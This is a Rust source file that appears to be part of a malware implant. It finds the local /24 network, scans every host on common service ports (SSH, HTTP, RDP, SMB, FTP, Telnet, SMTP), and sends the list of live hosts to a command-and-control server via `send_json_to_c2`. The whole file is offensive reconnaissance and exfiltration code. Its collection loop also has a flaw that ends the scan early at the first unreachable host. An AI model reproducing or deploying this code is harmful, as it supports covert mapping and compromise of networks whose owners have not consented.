use crate::connexion::send_json_to_c2;
use anyhow::{anyhow, Result};
use futures::stream::{FuturesUnordered, StreamExt};
use if_addrs::get_if_addrs;
use ipnetwork::IpNetwork;
use rand::rng;
use rand::seq::SliceRandom;
use serde::{Deserialize, Serialize};
use serde_json::json;
use std::net::SocketAddr;
use std::sync::Arc;
use std::time::Duration;
use tokio::net::TcpStream;
use tokio::sync::Semaphore;

const PORTS_TO_SCAN: &[u16] = &[22, 80, 443, 3389, 445, 21, 23, 25];

#[derive(Serialize, Deserialize)]
struct ScanResult {
    network: String,
    port: u16,
    active_hosts: Vec<String>,
    total_scanned: u32,
    scan_duration_ms: u64,
}

#[derive(Serialize, Deserialize)]
struct ScanSet {
    scans: Vec<ScanResult>,
}

fn guess_local_network() -> Option<IpNetwork> {
    for iface in get_if_addrs().ok()? {
        if iface.name.starts_with("lo")
            || iface.name.starts_with("docker")
            || iface.name.starts_with("br-")
        {
            continue;
        }

        if let std::net::IpAddr::V4(ip) = iface.addr.ip() {
            if ip.is_loopback() || ip.octets()[0] == 169 {
                continue;
            }
            let cidr = format!(
                "{}.{}.{}.0/24",
                ip.octets()[0],
                ip.octets()[1],
                ip.octets()[2]
            );
            return cidr.parse().ok();
        }
    }
    None
}

async fn is_host_up(ip: String, port: u16, sem: Arc<Semaphore>) -> Option<String> {
    let _permit = sem.acquire().await.ok()?;
    let addr = format!("{}:{}", ip, port).parse::<SocketAddr>().ok()?;
    if tokio::time::timeout(Duration::from_millis(500), TcpStream::connect(addr))
        .await
        .is_ok()
    {
        Some(ip)
    } else {
        None
    }
}
async fn scan_port(port: u16, network: IpNetwork) -> ScanResult {
    let start = std::time::Instant::now();

    let sem = Arc::new(Semaphore::new(20));

    let mut tasks = FuturesUnordered::new();

    let mut ips: Vec<_> = network.iter().map(|ip| ip.to_string()).collect();

    ips.shuffle(&mut rng());

    let total_ips = ips.len() as u32;

    for ip in ips {
        tasks.push(is_host_up(ip.clone(), port, sem.clone()));
    }

    let mut active_hosts = Vec::new();
    while let Some(Some(ip)) = tasks.next().await {
        active_hosts.push(ip);
    }

    ScanResult {
        network: network.to_string(),
        port,
        active_hosts,
        total_scanned: total_ips,
        scan_duration_ms: start.elapsed().as_millis() as u64,
    }
}

pub async fn scan_all_ports() -> Result<()> {
    let network = guess_local_network().ok_or_else(|| anyhow!("Aucun réseau local détecté"))?;

    let mut scan_results = Vec::new();

    for &port in PORTS_TO_SCAN {
        let result = scan_port(port, network).await;
        scan_results.push(result);
    }

    let data = ScanSet {
        scans: scan_results,
    };

    let json = json!(&data);

    send_json_to_c2(&json).await?;

    Ok(())
}
